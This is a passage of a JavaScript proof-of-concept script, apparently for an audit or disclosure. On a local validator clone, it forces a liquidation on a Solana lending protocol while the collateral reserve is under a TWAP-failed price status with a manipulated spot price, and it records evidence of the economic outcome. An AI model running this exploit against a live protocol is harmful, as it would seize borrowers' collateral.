      // 6. Liquidation: refresh (collateral, debt), refresh obligation, then liquidate.
      const target = obligations[0];
      const before = await readObligation(target.kp.publicKey);
      const borrowedAmount = (target.sf + TWO60 - 1n) / TWO60;
      const liquidateData = Buffer.concat([Buffer.from(disc("liquidate_obligation_and_redeem_reserve_collateral")), u64(borrowedAmount), u64(0n), u64(0n)]);
      const liqIx = new web3.TransactionInstruction({
        programId: new web3.PublicKey(PROGRAM_ID),
        keys: [
          { pubkey: liquidator.publicKey, isSigner: true, isWritable: false },
          { pubkey: target.kp.publicKey, isSigner: false, isWritable: true },
          { pubkey: new web3.PublicKey(MAIN_MARKET), isSigner: false, isWritable: false },
          { pubkey: authority, isSigner: false, isWritable: false },
          { pubkey: new web3.PublicKey(debt.pubkey), isSigner: false, isWritable: true },
          { pubkey: new web3.PublicKey(debt.liquidityMint), isSigner: false, isWritable: false },
          { pubkey: new web3.PublicKey(debt.liquiditySupplyVault), isSigner: false, isWritable: true },
          { pubkey: new web3.PublicKey(collateral.pubkey), isSigner: false, isWritable: true },
          { pubkey: new web3.PublicKey(collateral.liquidityMint), isSigner: false, isWritable: false },
          { pubkey: new web3.PublicKey(collateral.collateralMint), isSigner: false, isWritable: true },
          { pubkey: new web3.PublicKey(collateral.collateralSupplyVault), isSigner: false, isWritable: true },
          { pubkey: new web3.PublicKey(collateral.liquiditySupplyVault), isSigner: false, isWritable: true },
          { pubkey: new web3.PublicKey(collateral.liquidityFeeVault), isSigner: false, isWritable: true },
          { pubkey: usdcUser, isSigner: false, isWritable: true },
          { pubkey: cethUser, isSigner: false, isWritable: true },
          { pubkey: wethUser, isSigner: false, isWritable: true },
          { pubkey: new web3.PublicKey(SPL_TOKEN_PROGRAM), isSigner: false, isWritable: false },
          { pubkey: new web3.PublicKey(SPL_TOKEN_PROGRAM), isSigner: false, isWritable: false },
          { pubkey: new web3.PublicKey(SPL_TOKEN_PROGRAM), isSigner: false, isWritable: false },
          { pubkey: new web3.PublicKey(SYSVAR_INSTRUCTIONS), isSigner: false, isWritable: false },
        ],
        data: liquidateData,
      });
      const bal = async (pk) => Number((await localCall(rpcUrl, "getTokenAccountBalance", [pk.toBase58(), { commitment: "confirmed" }])).value.amount);
      const balancesBefore = { usdcUser: await bal(usdcUser), cethUser: await bal(cethUser), wethUser: await bal(wethUser) };
      const feeReceiverBefore = await bal(new web3.PublicKey(collateral.liquidityFeeVault));
      const r = await sendTx([refreshIx(collateral), refreshIx(debt), refreshObligIx(target.kp.publicKey), liqIx]);
      await sleep(1500);
      const balancesAfter = { usdcUser: await bal(usdcUser), cethUser: await bal(cethUser), wethUser: await bal(wethUser) };
      const after = r.txDetail ? await readObligation(target.kp.publicKey) : null;
      evidence.liquidation = { debtSf: target.sf.toString(), borrowedAmount: borrowedAmount.toString(), before, sig: r.sig, err: r.err, detailErr: r.txDetail?.meta?.err ?? null, computeUnits: r.txDetail?.meta?.computeUnitsConsumed ?? null, feeLamports: r.txDetail?.meta?.fee ?? null, logs: r.logs, balancesBefore, balancesAfter };
      // Read the collateral reserve's stored price_status and confirm it is the TWAP-failed reduced value.
      const crInfo = await localCall(rpcUrl, "getAccountInfo", [collateral.pubkey, { encoding: "base64", commitment: "confirmed" }], 30000);
      const cr = decodeData(crInfo.value);
      const crStatus = cr.readUInt8(R.lastUpdateStatus);
      evidence.postLiquidation = {
        obligation: after, collateralReserveStatus: { statusHex: `0x${crStatus.toString(16).padStart(2, "0")}`, reduced: (crStatus & FLAGS.LIQUIDATION_CHECKS) === FLAGS.LIQUIDATION_CHECKS && (crStatus & FLAGS.ALL_CHECKS) !== FLAGS.ALL_CHECKS, lastUpdateSlot: Number(cr.readBigUInt64LE(R.lastUpdateSlot)) },
        feeReceiverBefore, feeReceiverAfter: await bal(new web3.PublicKey(collateral.liquidityFeeVault)),
        refreshGateLogs: r.logs.filter((l) => /check_refresh|Instruction: Refresh|twap|TWAP/i.test(l)),
      };

      const succeeded = !!r.txDetail && !r.txDetail.meta?.err;
      evidence.economics = {
        executed: succeeded,
        usdcRepaid: BigInt(balancesBefore.usdcUser) - BigInt(balancesAfter.usdcUser),
        cethReceived: BigInt(balancesAfter.cethUser) - BigInt(balancesBefore.cethUser),
        wethReceived: BigInt(balancesAfter.wethUser) - BigInt(balancesBefore.wethUser),
        protocolFeeToFeeVault: BigInt(evidence.postLiquidation.feeReceiverAfter) - BigInt(evidence.postLiquidation.feeReceiverBefore),
        txFeeLamports: r.txDetail?.meta?.fee ?? null,
        computeUnits: r.txDetail?.meta?.computeUnitsConsumed ?? null,
        trueCollateralSpot: realCollSpot.toString(), manipulatedCollateralSpot: scaledSpot.toString(), collSpotExp: collSpotExp.toString(),
      };
      if (succeeded) { evidence.result = "LIQUIDATION_EXECUTED_UNDER_REDUCED_STATUS"; ok = true; }
      else { evidence.result = "LIQUIDATION_FAILED_ONCHAIN"; evidence.failure = r.err || JSON.stringify(r.txDetail?.meta?.err); }
    }
  } catch (e) {
    evidence.result = "FAIL";
    evidence.failure = String(e?.message || e);
    evidence.unproven = ["liquidation-not-executed"];
    evidence.validatorLogTail = sanitizeLog(logBuf).slice(-6000);
  } finally {
    try { child.kill(IS_WIN ? undefined : "SIGKILL"); } catch (_) { /* ignore */ }
    await sleep(1200);
    try { relay.server.close(); } catch (_) { /* ignore */ }
    const rs = relay.stats();
    evidence.relay = { bind: "127.0.0.1", methods: rs.methods, deniedMethods: rs.deniedMethods, bytesIn: rs.bytesIn, bytesOut: rs.bytesOut };
    evidence.validator = { exitCode: exitInfo ? exitInfo.code : null, logSha256: sha256(Buffer.from(sanitizeLog(logBuf))), logLen: logBuf.length, redacted: true };
    try { fs.mkdirSync(EVIDENCE_DIR, { recursive: true }); fs.writeFileSync(path.join(EVIDENCE_DIR, "liquidation-repro.json"), JSON.stringify(evidence, bigintReplacer, 2), "utf8"); } catch (e) { console.error(`[liq] evidence write failed: ${e.message}`); }
  }
  console.error(JSON.stringify({ result: evidence.result, failure: evidence.failure || null, cloneProof: evidence.cloneProof, liquidation: evidence.liquidation ? { err: evidence.liquidation.err, detailErr: evidence.liquidation.detailErr, computeUnits: evidence.liquidation.computeUnits } : null, economics: evidence.economics }, bigintReplacer, 2));
  process.exitCode = ok ? 0 : 1;
}

function u64(v) { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(v)); return b; }
function writeBigU64(buf, off, v) { buf.writeBigUInt64LE(BigInt(v), off); }
function Fraction(bits) { return Number(bits) / Number(TWO60); }
function pick(r) { return { liquidityMint: r.liquidityMint, collateralMint: r.collateralMint, liquiditySupplyVault: r.liquiditySupplyVault, collateralSupplyVault: r.collateralSupplyVault, liquidityFeeVault: r.liquidityFeeVault, scopeFeed: r.scopeFeed, ltvPct: r.ltvPct, liqThresholdPct: r.liqThresholdPct, borrowFactorPct: r.borrowFactorPct, mintDecimals: r.mintDecimals, totalAvailableAmount: r.totalAvailableAmount.toString }; }
function bigintReplacer(_k, v) { return typeof v === "bigint" ? v.toString() : v; }
function nameToPubkey(name, ctx) {
  if (name.startsWith("obligation_")) { const o = ctx.obligations.find((x) => x.kp.publicKey.toBase58().startsWith(name.slice("obligation_".length))); return o.kp.publicKey.toBase58(); }
  switch (name) {
    case "collReserve": return ctx.collateral.pubkey;
    case "debtReserve": return ctx.debt.pubkey;
    case "collScope": return ctx.collateral.scopeFeed;
    case "debtScope": return ctx.debt.scopeFeed;
    case "usdcUser": return ctx.usdcUser.toBase58();
    case "cethUser": return ctx.cethUser.toBase58();
    case "wethUser": return ctx.wethUser.toBase58();
    default: throw new Error(`unknown account name ${name}`);
  }
}

run().catch((e) => { console.error(`[liq][fatal] ${e?.message || e}`); process.exitCode = 1; });
